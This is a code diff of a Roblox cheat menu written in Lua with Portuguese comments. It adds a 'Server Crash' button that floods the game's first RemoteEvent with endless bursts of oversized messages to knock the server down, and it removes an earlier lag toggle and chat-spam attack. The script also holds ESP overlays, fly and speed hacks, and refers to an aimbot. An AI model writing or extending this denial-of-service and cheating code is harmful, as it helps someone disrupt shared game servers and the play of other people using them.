@@ -109,43 +109,31 @@ VisualSect:NewToggle("Infos", "Nome/Vida", function(v) _G.ESP_Info = v end)
 local Trol = Window:NewTab("Trol")
 Trol:NewSection("Movimento"):NewSlider("Speed", "Velocidade", 500, 16, function(v) _G.Speed = v end)
 Trol:NewSection("Fly"):NewToggle("Fly", "Voar", function(v) _G.Fly = v end)
--- ADIÇÃO: Velocidade do Fly
-Trol:NewSlider("Fly Speed", "Velocidade do Voo", 500, 10, function(v) _G.FlySpeed = v end)
+-- ADIÇÃO: Slider para Velocidade do Voo
+Trol:NewSlider("Velocidade do Voo", "Aumenta o Fly", 500, 10, function(v) _G.FlySpeed = v end)
 
--- SEÇÃO DE CRASH / LAG (ADICIONADA)
-local LagSect = Trol:NewSection("Server Crash & Lag")
-LagSect:NewToggle("Lag Server (Spam Events)", "Tenta derrubar o servidor", function(v)
-    _G.LagServer = v
-    if v then
+-- ADIÇÃO: Seção de Crash
+local CrashSect = Trol:NewSection("Server Crash")
+CrashSect:NewButton("Crash Server (Method 1)", "Tenta derrubar o server", function()
+    _G.Crashing = true
+    while _G.Crashing do
         task.spawn(function()
-            while _G.LagServer do
-                for i = 1, 150 do -- Intensidade aumentada para tentativa de crash
-                    task.spawn(function()
-                        local remote = game:GetService("ReplicatedStorage"):FindFirstChildOfClass("RemoteEvent")
-                        if remote then
-                            remote:FireServer("Lag", "GGPVP")
-                        end
-                    end)
+            for i = 1, 500 do
+                local remote = game:GetService("ReplicatedStorage"):FindFirstChildOfClass("RemoteEvent")
+                if remote then
+                    remote:FireServer("Crash", string.rep("GGPVP", 1000))
                 end
-                task.wait(0.05)
             end
         end)
+        task.wait()
     end
 end)
-
-LagSect:NewButton("Chat Spam (Crash Chat)", "Tenta travar o chat de todos", function()
-    for i = 1, 20 do
-        local chatEvent = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
-        if chatEvent and chatEvent:FindFirstChild("SayMessageRequest") then
-            chatEvent.SayMessageRequest:FireServer("GGPVP ON TOP - CRASHING...", "All")
-        end
-    end
-end)
+CrashSect:NewButton("Parar Crash", "Para o envio de dados", function() _G.Crashing = false end)
 
 local Config = Window:NewTab("Config")
 Config:NewSection("Menu"):NewKeybind("Abrir/Fechar", "", Enum.KeyCode.RightControl, function(k) _G.MenuKey = k end)
 Config:NewSection("Sair"):NewButton("Kill Script", "Limpar TUDO", function()
-    _G.Aimbot = false; _G.ESP_Enabled = false; _G.FovVisible = false; _G.LagServer = false; FOVCircle:Destroy()
+    _G.Aimbot = false; _G.ESP_Enabled = false; _G.FovVisible = false; _G.LagServer = false; _G.Crashing = false; FOVCircle:Destroy()
     pcall(function() CoreGui:FindFirstChild("🎯 GGPVP |by six"):Destroy() end)
 end)
 
@@ -185,7 +173,7 @@ RunService.Heartbeat:Connect(function()
             if UIS:IsKeyDown(Enum.KeyCode.S) then vel -= Camera.CFrame.LookVector end
             if UIS:IsKeyDown(Enum.KeyCode.A) then vel -= Camera.CFrame.RightVector end
             if UIS:IsKeyDown(Enum.KeyCode.D) then vel += Camera.CFrame.RightVector end
-            -- AGORA USA A VARIÁVEL FLYSPEED DO SLIDER
+            -- AGORA USA A VARIÁVEL FLYSPEED DO NOVO SLIDER
             root.FlyForce.Velocity = vel * _G.FlySpeed
         elseif root and root:FindFirstChild("FlyForce") then
             root.FlyForce:Destroy()
@@ -194,6 +182,7 @@ RunService.Heartbeat:Connect(function()
 end)
 
 -- ESP MANTIDO
+-- ESP OTIMIZADO (COM LIMPEZA DE OBJETOS TRAVADOS)
 local ESP_Table = {}
 
 local function ClearESP(plr)
@@ -211,6 +200,7 @@ end
 RunService.RenderStepped:Connect(function()
     for _, p in ipairs(Players:GetPlayers()) do
         if p ~= LP then
+            -- Cria se não existir
             if not ESP_Table[p] then
                 ESP_Table[p] = {Box = Drawing.new("Square"), Text = Drawing.new("Text")}
                 ESP_Table[p].Box.Thickness = 1
@@ -222,6 +212,7 @@ RunService.RenderStepped:Connect(function()
             local obj = ESP_Table[p]
             local char = p.Character
             
+            -- Só mostra se o ESP estiver ON, o personagem existir e estiver vivo
             if _G.ESP_Enabled and char and char:FindFirstChild("HumanoidRootPart") and char:FindFirstChild("Humanoid") and char.Humanoid.Health > 0 then
                 local pos, on = Camera:WorldToViewportPoint(char.HumanoidRootPart.Position)
                 
@@ -241,6 +232,7 @@ RunService.RenderStepped:Connect(function()
                     obj.Text.Visible = false
                 end
             else
+                -- Limpa da tela se o jogador morrer ou você desligar o ESP
                 obj.Box.Visible = false
                 obj.Text.Visible = false
             end
@@ -248,4 +240,5 @@ RunService.RenderStepped:Connect(function()
     end
 end)
 
+-- Limpa quando o jogador sai do servidor para não sobrar quadrado
 game.Players.PlayerRemoving:Connect(ClearESP)
